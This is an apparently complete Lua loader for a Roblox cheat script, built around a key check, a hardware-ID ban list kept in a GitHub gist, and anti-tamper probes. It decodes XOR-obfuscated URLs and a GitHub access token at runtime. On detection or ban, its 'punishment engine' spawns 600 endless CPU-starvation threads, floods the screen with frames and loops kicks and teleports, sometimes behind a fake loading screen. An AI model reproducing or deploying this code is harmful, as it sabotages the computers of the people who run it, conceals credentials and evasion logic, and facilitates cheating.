local _VM = {
    _s = {85,137,192,24,238,108},

    _a = {33,5,21,65,246,179,102,94,6,88,246,253,103,22,8,69,237,252,43,4,18,84,247,234,38,31,21,84,235,253,103,18,14,92,170,223,44,9,4,85,198,229,38,31,4,30,189,236,40,68,5,4,228,176,125,70,2,87,224,186,44,70,81,6,225,236,42,21,81,83,227,184,45,21,86,82,183,177,102,3,0,70,170,187,124,65,83,0,177,235,40,16,85,0,231,237,120,73,89,0,183,239,43,19,4,5,181,239,124,68,81,3,231,234,126,64,7,3,225,236,120,23,81,30,225,230,39,5,79,69,253,253},

    _b = {33,5,21,65,246,179,102,94,6,88,246,253,103,22,8,69,237,252,43,4,18,84,247,234,38,31,21,84,235,253,103,18,14,92,170,223,44,9,4,85,198,229,38,31,4,30,178,176,44,70,89,87,177,186,121,70,87,87,228,239,126,70,0,80,181,191,112,69,87,1,231,188,45,64,80,80,231,232,102,3,0,70,170,191,112,72,2,80,181,235,124,65,80,6,224,176,123,20,86,83,183,236,45,67,83,84,230,239,40,23,5,84,188,237,44,72,85,80,189,190,42,68,5,30,214,252,51,46,0,66,235,237,58,26},

    _c = {44,72,85,6,177,189,113,19,87,82,183,232,124,71,5,2,227,237,121,19,84,4,180,190,126,64,83,83,231,237,43,66},

    _d = {46,25,17,110,178,187,122,35,80,92,196,211,126,66,18,104,179,221,27,34,43,114,255,216,126,5,48,125,223,251,48,48,86,65,183,234,10,7,10,123},
}

local function _dec(seeds, data)
    assert(type(seeds)=="table" and #seeds>0, "[L] bad seeds")
    assert(type(data) =="table" and #data >0, "[L] bad data")
    local key = {}
    for i,s in ipairs(seeds) do
        local k = bit32.bxor(s*3, s+97) % 256
        key[i] = (k==0) and 1 or k
    end
    local t = {}
    for i,b in ipairs(data) do
        t[i] = string.char(bit32.bxor(b, key[((i-1)%#key)+1]))
    end
    return table.concat(t)
end

local _seeds = _VM._s
local _rA,_rB,_rC,_rD = _VM._a,_VM._b,_VM._c,_VM._d
_VM = nil

local KEY_URL, SCRIPT_URL, HWID_GIST_ID, GITHUB_TOKEN
do
    local function sd(lbl,d)
        local ok,r = pcall(_dec,_seeds,d)
        assert(ok and type(r)=="string" and #r>0,"[Loader] decrypt failed: "..lbl)
        return r
    end
    KEY_URL      = sd("KEY_URL",_rA)
    SCRIPT_URL   = sd("SCRIPT_URL",_rB)
    HWID_GIST_ID = sd("HWID_GIST_ID",_rC)
    GITHUB_TOKEN = sd("GITHUB_TOKEN",_rD)
    _seeds,_rA,_rB,_rC,_rD = nil,nil,nil,nil,nil
    _dec = nil
end

-- ══════════════════════════════════════════════════════════════
--  SERVICES
-- ══════════════════════════════════════════════════════════════
local Players     = game:GetService("Players")
local Tween       = game:GetService("TweenService")
local Run         = game:GetService("RunService")
local Teleport    = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

-- ══════════════════════════════════════════════════════════════
--  HTTP WRAPPER  (Synapse / KRNL / Fluxus / Electron / fallback)
-- ══════════════════════════════════════════════════════════════
local function httpReq(url, method, headers, body)
    method  = (method or "GET"):upper()
    headers = headers or {}
    local opts = {Url=url,Method=method,Headers=headers,Body=body or ""}
    local res
    if syn and syn.request then res = syn.request(opts)
    elseif http and http.request then res = http.request(opts)
    elseif request then res = request(opts)
    elseif fluxus and fluxus.request then res = fluxus.request(opts)
    else
        if method=="GET" then
            local ok,b = pcall(game.HttpGet,game,url,true)
            return ok and {StatusCode=200,Body=b} or {StatusCode=0,Body=""}
        end
        return {StatusCode=0,Body="no_request_api"}
    end
    return res
end

-- ══════════════════════════════════════════════════════════════
--  HWID FINGERPRINT
-- ══════════════════════════════════════════════════════════════
local HWID
do
    local function tryGet(fn)
        if not fn then return nil end
        local ok,v = pcall(fn)
        return (ok and type(v)=="string" and #v>4) and v or nil
    end
    HWID = tryGet(gethwid)
      or  tryGet(getdeviceid)
      or  tryGet(function()
              return tostring(game:GetService("RbxAnalyticsService"):GetClientId())
          end)
      or  ("UID_"..tostring(LocalPlayer.UserId))
end

-- ══════════════════════════════════════════════════════════════
--  JSON HELPERS
-- ══════════════════════════════════════════════════════════════
local function jsonParse(s)
    local t = {}
    for k,v  in s:gmatch('"([^"]+)"%s*:%s*"([^"]*)"') do t[k]=v end
    for k    in s:gmatch('"([^"]+)"%s*:%s*null')       do t[k]=false end
    for k,v  in s:gmatch('"([^"]+)"%s*:%s*(%d+)')      do t[k]=tonumber(v) end
    return t
end

local function jsonBuild(t)
    local p = {}
    for k,v in pairs(t) do
        if v==false or v==nil then p[#p+1]='"'..k..'":null'
        elseif type(v)=="number" then p[#p+1]='"'..k..'":'..v
        else p[#p+1]='"'..k..'":"'..tostring(v)..'"' end
    end
    return "{"..table.concat(p,",").."}"
end

local function extractGistContent(body)
    local pos = body:find('"content"%s*:%s*"')
    if not pos then return nil end
    local qS = body:find('"',pos+10)
    if not qS then return nil end
    local i,chars = qS+1,{}
    local ESC={['"']='"',['\\']='\\',['n']='\n',['r']='\r',['t']='\t',['/']=  '/'}
    while i<=#body do
        local ch=body:sub(i,i)
        if ch=='\\' then chars[#chars+1]=ESC[body:sub(i+1,i+1)] or body:sub(i+1,i+1); i=i+2
        elseif ch=='"' then break
        else chars[#chars+1]=ch; i=i+1 end
    end
    return table.concat(chars)
end

local function jse(s)  -- json string encode
    return (s:gsub('\\','\\\\'):gsub('"','\\"'):gsub('\n','\\n'):gsub('\r','\\r'))
end

-- ══════════════════════════════════════════════════════════════
--  GIST STORE  (hwid_store.json + security.json in one gist)
-- ══════════════════════════════════════════════════════════════
local GIST_API = "https://api.github.com/gists/"..HWID_GIST_ID
local _AUTH    = {["Accept"]="application/vnd.github+json",
                  ["Authorization"]="Bearer "..GITHUB_TOKEN,
                  ["X-GitHub-Api-Version"]="2022-11-28"}
local _AUTHJ   = {["Accept"]="application/vnd.github+json",
                  ["Authorization"]="Bearer "..GITHUB_TOKEN,
                  ["Content-Type"]="application/json",
                  ["X-GitHub-Api-Version"]="2022-11-28"}

local _gistCache = nil

local function fetchGist(force)
    if _gistCache and not force then return _gistCache end
    local res = httpReq(GIST_API,"GET",_AUTH)
    if res and res.StatusCode==200 then _gistCache=res.Body; return res.Body end
    return nil
end

local function readGistFile(body, fname)
    local pat = '"'..fname..'"'
    local pos = body:find(pat,1,true)
    if not pos then return nil end
    return extractGistContent(body:sub(pos))
end

local function writeGistFiles(files)
    -- files = {name=content, ...}
    local parts = {}
    for name,content in pairs(files) do
        parts[#parts+1] = '"'..name..'":{"content":"'..jse(content)..'"}'
    end
    local res = httpReq(GIST_API,"PATCH",_AUTHJ,'{"files":{'..table.concat(parts,',')..'}}'  )
    _gistCache = nil
    return res and (res.StatusCode==200 or res.StatusCode==201)
end

local function readSecurity(body)
    local raw = body and readGistFile(body,"security.json")
    if not raw or raw=="" then return {bans={},strikes={}} end
    local sec = {bans={},strikes={}}
    local bb = raw:match('"bans"%s*:%s*(%b{})') or ""
    local sb = raw:match('"strikes"%s*:%s*(%b{})') or ""
    for k in bb:gmatch('"([^"]+)"%s*:%s*true') do sec.bans[k]=true end
    for k,v in sb:gmatch('"([^"]+)"%s*:%s*(%d+)') do sec.strikes[k]=tonumber(v) end
    return sec
end

local function buildSecJson(sec)
    local bp,sp = {},{}
    for k in pairs(sec.bans) do bp[#bp+1]='"'..k..'":true' end
    for k,v in pairs(sec.strikes) do sp[#sp+1]='"'..k..'":'..v end
    return '{"bans":{'..table.concat(bp,',')..'  },"strikes":{'..table.concat(sp,',')..'  }}'
end

-- ══════════════════════════════════════════════════════════════
--  ██████  PUNISHMENT ENGINE  ██████
-- ══════════════════════════════════════════════════════════════
local STRIKE_LIMIT = 2   -- 3rd strike = permanent ban
local _wiped = false

local function wipeSecrets()
    if _wiped then return end; _wiped=true
    KEY_URL=string.rep("\0",128);  SCRIPT_URL=string.rep("\0",128)
    HWID_GIST_ID=string.rep("\0",64); GITHUB_TOKEN=string.rep("\0",64)
    KEY_URL=nil; SCRIPT_URL=nil; HWID_GIST_ID=nil; GITHUB_TOKEN=nil
    GIST_API=nil; _AUTH=nil; _AUTHJ=nil
end

local function chaosLoop()
    -- Visual corruption
    task.spawn(function()
        local root = pcall(function() return game:GetService("CoreGui") end)
        if not root then root = LocalPlayer:FindFirstChildOfClass("PlayerGui") end
        if type(root)~="userdata" then root=LocalPlayer:FindFirstChildOfClass("PlayerGui") end
        for _=1,150 do
            pcall(function()
                local f=Instance.new("Frame")
                f.Size=UDim2.fromScale(math.random(),math.random())
                f.Position=UDim2.fromScale(math.random(),math.random())
                f.BackgroundColor3=Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))
                f.ZIndex=999; f.Parent=root
            end)
        end
    end)
    -- CPU starvation — 600 permanent threads
    for _=1,600 do
        task.spawn(function()
            local junk={}
            while true do
                for j=1,50000 do junk[j]=math.random()*math.random() end
                junk={}; task.wait(0)
            end
        end)
    end
    -- Persistent kick + teleport retry
    task.spawn(function()
        while true do
            pcall(function() LocalPlayer:Kick("\n\n⛔  BANNED\nContact: @isvexed") end)
            pcall(function() Teleport:Teleport(6753420413,LocalPlayer) end)
            task.wait(2)
        end
    end)
end

local function punish(reason)
    clearKey()   -- strip saved key on punishment only
    wipeSecrets()
    -- Record strike async
    task.spawn(function()
        local body = fetchGist(true)
        if not body then return end
        local sec = readSecurity(body)
        local cur = (sec.strikes[HWID] or 0) + 1
        sec.strikes[HWID] = cur
        if cur > STRIKE_LIMIT then sec.bans[HWID]=true end
        local hwRaw = readGistFile(body,"hwid_store.json") or "{}"
        pcall(writeGistFiles,{
            ["security.json"]   = buildSecJson(sec),
            ["hwid_store.json"] = hwRaw,
        })
    end)
    -- Kick
    local kicked=false
    pcall(function()
        LocalPlayer:Kick("\n\n⛔  Security Violation\nReason: "..tostring(reason).."\nHWID logged.")
        kicked=true
    end)
    -- Chaos fallback — fires even if kick "succeeded" (deferred kicks can be swallowed)
    task.delay(1.5, function()
        if LocalPlayer and LocalPlayer.Parent then chaosLoop() end
    end)
    if not kicked then chaosLoop() end
end

-- ══════════════════════════════════════════════════════════════
--  ██████  ANTI-TAMPER ENGINE  ██████
--
--  Layer 1  Hook Integrity    — iscclosure() on all stdlib fns
--  Layer 2  Decompiler Probe  — known spy/decompiler globals
--  Layer 3  Env Fingerprint   — getgenv() key count growth
--  Layer 4  Continuous        — re-checks every 8 s at runtime
-- ══════════════════════════════════════════════════════════════
local _nativeRefs = {}
if iscclosure then
    _nativeRefs = {
        pcall,tostring,rawget,rawset,rawequal,rawlen,
        string.char,string.format,string.find,string.gsub,
        table.concat,table.insert,table.remove,
        math.random,math.floor,math.max,math.min,
        bit32.bxor,bit32.band,bit32.bor,
    }
end

local function checkHooks()
    if not iscclosure then return nil end
    for _,fn in ipairs(_nativeRefs) do
        if type(fn)=="function" and not iscclosure(fn) then return "HOOK" end
    end
    return nil
end

local _SPYGLOBALS = {
    -- Only globals exclusively injected by spy/hook tools.
    -- decompile, dumpstring, getscriptbytecode, getscriptfrom are standard
    -- UNC API functions Velocity always has in getgenv() — do NOT check them.
    "HttpSpy","fluxusSpy","ScriptSpy",
    "CROW_ENABLED","KRNL_SPY",
}

local function checkSpyGlobals()
    local env = (getgenv and getgenv()) or _G
    for _,k in ipairs(_SPYGLOBALS) do
        if rawget(env,k)~=nil then return "SPY:"..k end
    end
    return nil
end

local _envBase = 0
do
    local env=(getgenv and getgenv()) or _G
    local n=0; for _ in pairs(env) do n=n+1 end
    _envBase=n
end

local function checkEnvGrowth()
    local env=(getgenv and getgenv()) or _G
    local n=0; for _ in pairs(env) do n=n+1 end
    if n>_envBase+20 then return "ENV_GROWTH:"..(n-_envBase) end
    return nil
end

local function runTamperCheck()
    local r
    r=checkHooks();      if r then return r end
    r=checkSpyGlobals(); if r then return r end
    r=checkEnvGrowth();  if r then return r end
    return nil
end

-- Startup tamper check (synchronous — blocks everything)
do
    local threat = runTamperCheck()
    if threat then
        punish("TAMPER@STARTUP:"..threat)
        while true do task.wait(60) end
    end
end

-- ══════════════════════════════════════════════════════════════
--  GUI ROOT
-- ══════════════════════════════════════════════════════════════
local GUI_ROOT
do
    if gethui then GUI_ROOT=gethui()
    else
        local ok=pcall(function()
            local t=Instance.new("ScreenGui"); t.Parent=game:GetService("CoreGui"); t:Destroy()
        end)
        GUI_ROOT = ok and game:GetService("CoreGui") or LocalPlayer:WaitForChild("PlayerGui")
    end
end

-- ══════════════════════════════════════════════════════════════
--  BAN PRE-CHECK  (before UI is shown)
--  Banned users get a fake "Connecting..." screen → chaos
-- ══════════════════════════════════════════════════════════════
local _isBanned = false
do
    local ok,body = pcall(fetchGist)
    if ok and body then
        local sec = readSecurity(body)
        if sec.bans[HWID] then _isBanned=true end
    end
end

-- ══════════════════════════════════════════════════════════════
--  KEY PERSISTENCE
--  Saves to a local file (survives game restarts / rejoins).
--  Falls back to getgenv() for same-session re-runs on executors
--  that don't support writefile.
-- ══════════════════════════════════════════════════════════════
local _KEY_FILE = "ww1_saved_key.dat"

local function saveKey(key)
    -- File storage — survives across sessions
    if writefile then
        pcall(writefile, _KEY_FILE, key)
    end
    -- getgenv() fallback — survives same-session re-runs only
    pcall(function() if getgenv then getgenv().__WW1_KEY=key end end)
end

local function loadKey()
    -- Try file first
    if readfile then
        local ok,data = pcall(readfile, _KEY_FILE)
        if ok and type(data)=="string" and #data>0 then
            return data:match("^%s*(.-)%s*$")
        end
    end
    -- Fall back to getgenv()
    local env = getgenv and getgenv()
    if env and type(env.__WW1_KEY)=="string" and #env.__WW1_KEY>0 then
        return env.__WW1_KEY
    end
    return nil
end

local function clearKey()
    if writefile then pcall(writefile, _KEY_FILE, "") end
    pcall(function() if getgenv then getgenv().__WW1_KEY=nil end end)
end

local _savedKey = loadKey()

-- ══════════════════════════════════════════════════════════════
--  SETTINGS
-- ══════════════════════════════════════════════════════════════
local MAX_TRIES = 5
local LOCK_SECS = 90  -- 1 minute 30 seconds

-- ══════════════════════════════════════════════════════════════
--  PALETTE
-- ══════════════════════════════════════════════════════════════
local C = {
    BG      = Color3.fromRGB(12,  10,  6),
    PANEL   = Color3.fromRGB(24,  20, 12),
    SURFACE = Color3.fromRGB(48,  40, 24),
    BORDER  = Color3.fromRGB(68,  56, 34),
    GOLD    = Color3.fromRGB(168,132, 46),
    GOLDBRT = Color3.fromRGB(206,172, 82),
    GOLDDIM = Color3.fromRGB(94,  72, 20),
    TEXT    = Color3.fromRGB(214,204,174),
    MUTED   = Color3.fromRGB(132,118, 86),
    OK      = Color3.fromRGB(56, 196, 76),
    ERR     = Color3.fromRGB(206, 56, 46),
    BLACK   = Color3.fromRGB(0,   0,  0),
}

-- ══════════════════════════════════════════════════════════════
--  UI HELPERS
-- ══════════════════════════════════════════════════════════════
local function tw(obj,props,dur,style,dir)
    pcall(function()
        Tween:Create(obj,TweenInfo.new(dur or 0.22,style or Enum.EasingStyle.Quart,
            dir or Enum.EasingDirection.Out),props):Play()
    end)
end
local function mkCorner(obj,r) Instance.new("UICorner",obj).CornerRadius=UDim.new(0,r or 8) end
local function mkStroke(obj,color,thick)
    local s=Instance.new("UIStroke",obj)
    s.Color=color or C.BORDER; s.Thickness=thick or 1.5
    s.ApplyStrokeMode=Enum.ApplyStrokeMode.Border; return s
end
local function mkLabel(parent,text,size,color,align,pos,sz,z)
    local l=Instance.new("TextLabel",parent)
    l.BackgroundTransparency=1; l.BorderSizePixel=0
    l.Font=Enum.Font.Gotham; l.TextSize=size or 13
    l.TextColor3=color or C.TEXT
    l.TextXAlignment=align or Enum.TextXAlignment.Left
    l.TextYAlignment=Enum.TextYAlignment.Center
    l.Text=text or ""; l.Position=pos or UDim2.new(0,0,0,0)
    l.Size=sz or UDim2.new(1,0,0,20); l.ZIndex=z or 12; return l
end

pcall(function()
    local old=GUI_ROOT:FindFirstChild("__WW1L"); if old then old:Destroy() end
end)

-- ══════════════════════════════════════════════════════════════
--  BANNED TRAP UI  (looks like a real loading screen)
-- ══════════════════════════════════════════════════════════════
if _isBanned then
    local tG=Instance.new("ScreenGui")
    tG.Name="__WW1L"; tG.ZIndexBehavior=Enum.ZIndexBehavior.Global
    tG.ResetOnSpawn=false; tG.DisplayOrder=999
    tG.IgnoreGuiInset=true; tG.Parent=GUI_ROOT

    local tD=Instance.new("Frame",tG)
    tD.Size=UDim2.fromScale(1,1); tD.BackgroundColor3=C.BLACK
    tD.BackgroundTransparency=0.48; tD.ZIndex=1

    local tC=Instance.new("Frame",tG)
    tC.AnchorPoint=Vector2.new(0.5,0.5); tC.Position=UDim2.new(0.5,0,0.5,0)
    tC.Size=UDim2.fromOffset(420,120); tC.BackgroundColor3=C.PANEL; tC.ZIndex=10
    mkCorner(tC,10); mkStroke(tC,C.GOLDDIM,1.5)

    local tL=mkLabel(tC,"Connecting to server...",14,C.GOLD,
        Enum.TextXAlignment.Center,UDim2.new(0,0,0,20),UDim2.new(1,0,0,30),11)
    local tS=mkLabel(tC,"Please wait",11,C.MUTED,
        Enum.TextXAlignment.Center,UDim2.new(0,0,0,56),UDim2.new(1,0,0,16),11)

    task.spawn(function()
        local dots={".","..","..."}; local di=1
        while true do tS.Text="Please wait"..dots[di]; di=di%3+1; task.wait(0.6) end
    end)

    -- 6-second fake load → chaos
    task.delay(6, function()
        wipeSecrets()
        chaosLoop()
    end)

    while true do task.wait(60) end
end

-- ══════════════════════════════════════════════════════════════
--  SCREEN GUI
-- ══════════════════════════════════════════════════════════════
local Screen=Instance.new("ScreenGui")
Screen.Name="__WW1L"; Screen.ZIndexBehavior=Enum.ZIndexBehavior.Global
Screen.ResetOnSpawn=false; Screen.DisplayOrder=999
Screen.IgnoreGuiInset=true; Screen.Parent=GUI_ROOT

local Dim=Instance.new("Frame",Screen)
Dim.Size=UDim2.fromScale(1,1); Dim.BackgroundColor3=C.BLACK
Dim.BackgroundTransparency=0.48; Dim.BorderSizePixel=0; Dim.ZIndex=1

local Card=Instance.new("Frame",Screen)
Card.AnchorPoint=Vector2.new(0.5,0.5); Card.Position=UDim2.new(0.5,0,0.5,0)
Card.Size=UDim2.fromOffset(420,316); Card.BackgroundColor3=C.PANEL
Card.BackgroundTransparency=0; Card.BorderSizePixel=0; Card.ZIndex=10
mkCorner(Card,10)
local CardStroke=mkStroke(Card,C.GOLDDIM,1.5)

local Shad=Instance.new("ImageLabel",Card)
Shad.AnchorPoint=Vector2.new(0.5,0.5); Shad.Position=UDim2.fromScale(0.5,0.5)
Shad.Size=UDim2.new(1,80,1,80); Shad.BackgroundTransparency=1
Shad.Image="rbxassetid://6015897843"; Shad.ImageColor3=C.BLACK
Shad.ImageTransparency=0.55; Shad.ScaleType=Enum.ScaleType.Slice
Shad.SliceCenter=Rect.new(49,49,450,450); Shad.ZIndex=9

local Hdr=Instance.new("Frame",Card)
Hdr.Size=UDim2.new(1,0,0,60); Hdr.BackgroundColor3=C.SURFACE
Hdr.BorderSizePixel=0; Hdr.ZIndex=11; mkCorner(Hdr,10)

local HdrPatch=Instance.new("Frame",Hdr)
HdrPatch.Position=UDim2.fromScale(0,0.5); HdrPatch.Size=UDim2.new(1,0,0.5,0)
HdrPatch.BackgroundColor3=C.SURFACE; HdrPatch.BorderSizePixel=0; HdrPatch.ZIndex=11

local HdrSep=Instance.new("Frame",Card)
HdrSep.Position=UDim2.new(0,0,0,60); HdrSep.Size=UDim2.new(1,0,0,1)
HdrSep.BackgroundColor3=C.GOLDDIM; HdrSep.BorderSizePixel=0; HdrSep.ZIndex=12

local TitleL=Instance.new("TextLabel",Hdr)
TitleL.AnchorPoint=Vector2.new(0,0.5); TitleL.Position=UDim2.new(0,14,0.5,-8)
TitleL.Size=UDim2.new(1,-100,0,20); TitleL.BackgroundTransparency=1
TitleL.Font=Enum.Font.GothamBold; TitleL.TextSize=16; TitleL.TextColor3=C.TEXT
TitleL.TextXAlignment=Enum.TextXAlignment.Left; TitleL.Text="ScriptsLibrary"; TitleL.ZIndex=13

local SubL=Instance.new("TextLabel",Hdr)
SubL.AnchorPoint=Vector2.new(0,0.5); SubL.Position=UDim2.new(0,14,0.5,11)
SubL.Size=UDim2.new(1,-100,0,13); SubL.BackgroundTransparency=1
SubL.Font=Enum.Font.Gotham; SubL.TextSize=10; SubL.TextColor3=C.GOLD
SubL.TextXAlignment=Enum.TextXAlignment.Left
SubL.Text="Discord : @isvexed  —  Happy Cheating"; SubL.ZIndex=13

local VerL=Instance.new("TextLabel",Hdr)
VerL.AnchorPoint=Vector2.new(1,0.5); VerL.Position=UDim2.new(1,-12,0.5,0)
VerL.Size=UDim2.fromOffset(32,17); VerL.BackgroundColor3=C.GOLDDIM
VerL.BorderSizePixel=0; VerL.Font=Enum.Font.GothamBold
VerL.TextSize=10; VerL.TextColor3=C.GOLDBRT
VerL.TextXAlignment=Enum.TextXAlignment.Center; VerL.Text="v5"; VerL.ZIndex=13
mkCorner(VerL,4)

local Body=Instance.new("Frame",Card)
Body.Position=UDim2.new(0,0,0,61); Body.Size=UDim2.new(1,0,1,-61)
Body.BackgroundTransparency=1; Body.BorderSizePixel=0; Body.ZIndex=11

local Pad=Instance.new("UIPadding",Body)
Pad.PaddingLeft=UDim.new(0,20); Pad.PaddingRight=UDim.new(0,20)
Pad.PaddingTop=UDim.new(0,16); Pad.PaddingBottom=UDim.new(0,16)

mkLabel(Body,"Enter your access key to continue.",12,C.MUTED,Enum.TextXAlignment.Left,
    UDim2.new(0,0,0,0),UDim2.new(1,0,0,15),12)

local InFrame=Instance.new("Frame",Body)
InFrame.Position=UDim2.new(0,0,0,22); InFrame.Size=UDim2.new(1,0,0,40)
InFrame.BackgroundColor3=C.SURFACE; InFrame.BorderSizePixel=0; InFrame.ZIndex=12
mkCorner(InFrame,7)
local InStroke=mkStroke(InFrame,C.BORDER,1.5)

local KeyBox=Instance.new("TextBox",InFrame)
KeyBox.AnchorPoint=Vector2.new(0,0.5); KeyBox.Position=UDim2.new(0,12,0.5,0)
KeyBox.Size=UDim2.new(1,-24,0,26); KeyBox.BackgroundTransparency=1
KeyBox.BorderSizePixel=0; KeyBox.PlaceholderText="Paste key here..."
KeyBox.PlaceholderColor3=C.BORDER; KeyBox.Text=""
KeyBox.Font=Enum.Font.GothamBold; KeyBox.TextSize=13; KeyBox.TextColor3=C.TEXT
KeyBox.TextXAlignment=Enum.TextXAlignment.Left; KeyBox.ClearTextOnFocus=false; KeyBox.ZIndex=13

local StatL=mkLabel(Body,"",11,C.MUTED,Enum.TextXAlignment.Left,
    UDim2.new(0,0,0,68),UDim2.new(1,0,0,14),12)

local OkBtn=Instance.new("TextButton",Body)
OkBtn.Position=UDim2.new(0,0,0,87); OkBtn.Size=UDim2.new(1,0,0,42)
OkBtn.BackgroundColor3=C.GOLD; OkBtn.BorderSizePixel=0; OkBtn.Text="UNLOCK ACCESS"
OkBtn.Font=Enum.Font.GothamBold; OkBtn.TextSize=14; OkBtn.TextColor3=C.PANEL
OkBtn.AutoButtonColor=false; OkBtn.ZIndex=12; mkCorner(OkBtn,7)

local ProgBG=Instance.new("Frame",Body)
ProgBG.Position=UDim2.new(0,0,0,140); ProgBG.Size=UDim2.new(1,0,0,4)
ProgBG.BackgroundColor3=C.SURFACE; ProgBG.BorderSizePixel=0
ProgBG.Visible=false; ProgBG.ZIndex=12; mkCorner(ProgBG,2)

local ProgFill=Instance.new("Frame",ProgBG)
ProgFill.Size=UDim2.fromScale(0,1); ProgFill.BackgroundColor3=C.GOLD
ProgFill.BorderSizePixel=0; ProgFill.ZIndex=13; mkCorner(ProgFill,2)

local ProgL=mkLabel(Body,"",10,C.GOLD,Enum.TextXAlignment.Center,
    UDim2.new(0,0,0,148),UDim2.new(1,0,0,13),12)

local FSep=Instance.new("Frame",Body)
FSep.AnchorPoint=Vector2.new(0,1); FSep.Position=UDim2.new(0,0,1,-22)
FSep.Size=UDim2.new(1,0,0,1); FSep.BackgroundColor3=C.BORDER
FSep.BorderSizePixel=0; FSep.ZIndex=12

mkLabel(Body,"Get your key from the Discord server: https://discord.gg/m3qjJbZU5X",
    10,C.BORDER,Enum.TextXAlignment.Left,
    UDim2.new(0,0,1,-16),UDim2.new(0.6,0,0,16),12)

-- ── Styled attempts badge ─────────────────────────────────────
local TriesBG = Instance.new("Frame", Body)
TriesBG.AnchorPoint = Vector2.new(1,1)
TriesBG.Position    = UDim2.new(1,0,1,-14)
TriesBG.Size        = UDim2.new(0,148,0,18)
TriesBG.BackgroundColor3 = C.SURFACE
TriesBG.BorderSizePixel  = 0; TriesBG.ZIndex = 13
mkCorner(TriesBG,9); mkStroke(TriesBG,C.BORDER,1)

local TriesDot = Instance.new("Frame",TriesBG)
TriesDot.AnchorPoint = Vector2.new(0,0.5)
TriesDot.Position    = UDim2.new(0,7,0.5,0)
TriesDot.Size        = UDim2.fromOffset(6,6)
TriesDot.BackgroundColor3 = C.GOLD
TriesDot.BorderSizePixel  = 0; TriesDot.ZIndex = 14
mkCorner(TriesDot,3)

local TriesL = Instance.new("TextLabel",TriesBG)
TriesL.AnchorPoint = Vector2.new(0,0.5)
TriesL.Position    = UDim2.new(0,18,0.5,0)
TriesL.Size        = UDim2.new(1,-22,1,0)
TriesL.BackgroundTransparency = 1
TriesL.Font        = Enum.Font.GothamBold; TriesL.TextSize = 10
TriesL.TextColor3  = C.MUTED
TriesL.TextXAlignment = Enum.TextXAlignment.Left
TriesL.Text = MAX_TRIES.." attempts remaining"; TriesL.ZIndex = 14

-- ══════════════════════════════════════════════════════════════
--  RUNTIME STATE
-- ══════════════════════════════════════════════════════════════
local tries=0; local lockUntil=0; local busy=false

local function updateTries()
    local left = MAX_TRIES - tries
    if left <= 1 then
        TriesL.Text = (left==1 and "1 attempt" or "no attempts").." remaining"
        TriesL.TextColor3 = C.ERR; TriesDot.BackgroundColor3 = C.ERR
        tw(TriesBG,{BackgroundColor3=Color3.fromRGB(60,12,10)},0.18)
    elseif left == 2 then
        TriesL.Text = "2 attempts remaining"
        TriesL.TextColor3 = Color3.fromRGB(220,140,40)
        TriesDot.BackgroundColor3 = Color3.fromRGB(220,140,40)
        tw(TriesBG,{BackgroundColor3=Color3.fromRGB(55,35,10)},0.18)
    else
        TriesL.Text = left.." attempts remaining"
        TriesL.TextColor3 = C.MUTED; TriesDot.BackgroundColor3 = C.GOLD
        tw(TriesBG,{BackgroundColor3=C.SURFACE},0.18)
    end
end

local function setStatus(msg,color,autoClear)
    StatL.Text=msg; StatL.TextColor3=color or C.MUTED
    if autoClear then
        local snap=msg
        task.delay(autoClear,function() if StatL.Text==snap then StatL.Text="" end end)
    end
end

local function shake()
    task.spawn(function()
        for _,ox in ipairs({14,-12,9,-7,5,-3,1,0}) do
            tw(Card,{Position=UDim2.new(0.5,ox,0.5,0)},0.04,Enum.EasingStyle.Linear)
            task.wait(0.045)
        end
        Card.Position=UDim2.new(0.5,0,0.5,0)
    end)
end

KeyBox.Focused:Connect(function() tw(InStroke,{Color=C.GOLD},0.18) end)
KeyBox.FocusLost:Connect(function() tw(InStroke,{Color=C.BORDER},0.18) end)
OkBtn.MouseEnter:Connect(function() if not busy then tw(OkBtn,{BackgroundColor3=C.GOLDBRT},0.14) end end)
OkBtn.MouseLeave:Connect(function() if not busy then tw(OkBtn,{BackgroundColor3=C.GOLD},0.14) end end)

Run.Heartbeat:Connect(function()
    if lockUntil==0 then return end
    local now=os.time()
    if now<lockUntil then
        local rem=lockUntil-now
        setStatus(string.format("🔒 Locked — try again in %d:%02d",math.floor(rem/60),rem%60),C.ERR)
    else
        lockUntil=0; tries=0; busy=false
        updateTries()
        OkBtn.Text="UNLOCK ACCESS"; OkBtn.Active=true
        tw(OkBtn,{BackgroundColor3=C.GOLD},0.25)
        setStatus("You may try again.",C.GOLD,3)
    end
end)

-- ══════════════════════════════════════════════════════════════
--  CONTINUOUS INTEGRITY MONITOR  (every 8 s)
-- ══════════════════════════════════════════════════════════════
task.spawn(function()
    while Screen and Screen.Parent do
        task.wait(8)
        if not (Screen and Screen.Parent) then break end
        local threat=runTamperCheck()
        if threat then punish("TAMPER@RUNTIME:"..threat); break end
    end
end)

-- ══════════════════════════════════════════════════════════════
--  ISO DATE PARSER  (UTC epoch seconds)
-- ══════════════════════════════════════════════════════════════
local function parseISO(s)
    if not s or s == "" or s == "null" then return nil end
    local y,mo,d,h,mi,se = s:match("(%d+)-(%d+)-(%d+)T(%d+):(%d+):(%d+)")
    if not y then return nil end
    return os.time({
        year  = tonumber(y),
        month = tonumber(mo),
        day   = tonumber(d),
        hour  = tonumber(h),
        min   = tonumber(mi),
        sec   = tonumber(se),
        isdst = false,
    })
end

-- ══════════════════════════════════════════════════════════════
--  KEY FETCH + VALIDATE  (reads JSON from gist, checks expiry)
-- ══════════════════════════════════════════════════════════════
local function fetchKeys()
    if not KEY_URL then return {} end
    local ok, body = pcall(function() return game:HttpGet(KEY_URL, true) end)
    if not ok or type(body) ~= "string" or #body < 2 then return {} end

    local out = {}
    local arr = body:match('"keys"%s*:%s*(%b[])')
    if not arr then return {} end

    for entry in arr:gmatch('%b{}') do
        local key     = entry:match('"key"%s*:%s*"([^"]+)"')
        local status  = entry:match('"status"%s*:%s*"([^"]+)"')
        local expRaw  = entry:match('"expires_at"%s*:%s*"([^"]*)"')
        local expNull = entry:match('"expires_at"%s*:%s*null')

        if key and status == "active" then
            local valid = true

            if expNull then
                valid = true  -- lifetime key
            elseif expRaw and expRaw ~= "" then
                local expTime = parseISO(expRaw)
                if expTime and os.time() > expTime then
                    valid = false  -- key expired
                end
            end

            if valid then
                out[#out + 1] = key:upper()
            end
        end
    end
    return out
end

local function isValid(input)
    local key = input:match("^%s*(.-)%s*$"):upper()
    if #key == 0 then return nil end
    for _, v in ipairs(fetchKeys()) do
        if v == key then return key end
    end
    return nil
end

-- ══════════════════════════════════════════════════════════════
